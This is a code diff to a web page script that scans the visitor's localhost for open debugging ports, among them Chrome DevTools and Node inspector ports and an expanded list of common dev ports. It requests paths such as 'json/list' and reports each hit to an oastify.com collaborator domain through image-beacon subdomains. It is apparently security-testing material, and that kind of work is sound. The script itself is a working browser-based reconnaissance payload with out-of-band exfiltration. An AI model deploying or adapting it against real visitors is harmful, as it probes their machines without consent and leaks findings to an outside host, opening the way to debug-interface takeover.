@@ -9,13 +9,19 @@
 
   <script>
     const collaboratorDomain = '457mfhvylme5j9ytk1x6ns9j1a72v3js.oastify.com';
-    const ports = [9200, 9222, 9223, 9229]; // includes 9200
+    
+    // Expanded list of common debug ports (Puppeteer, Playwright, Node, VSCode, etc.)
+    const ports = [
+      9200, 9222, 9223, 9229, 1234, 1337, 3000, 3001, 3002,
+      3333, 4444, 5555, 6006, 7777, 8080
+    ];
+
     const paths = ['json', 'json/list', 'favicon.ico'];
     let found = false;
 
-    function sendToCollaborator(message) {
+    function sendToCollaborator(subdomain, path = '/') {
       const img = new Image();
-      img.src = `http://${message}.${collaboratorDomain}/`;
+      img.src = `http://${subdomain}.${collaboratorDomain}${path}`;
     }
 
     function testPortPath(port, path) {
@@ -48,7 +54,9 @@
             found = true;
             document.getElementById('result').innerText =
               `Found open port ${port} on path /${path}`;
-            sendToCollaborator(`open-${port}-${path.replace(/\W/g, '')}`);
+            
+            const id = `open-${port}-${path.replace(/\W/g, '')}`;
+            sendToCollaborator(id);
           }
         }
       }
@@ -56,7 +64,7 @@
       if (!found) {
         document.getElementById('result').innerText =
           'No open ports detected.';
-        sendToCollaborator('no-open-port');
+        sendToCollaborator('no-port-found', '/no-port-found');
       }
 
       console.log('Scan results:', results);
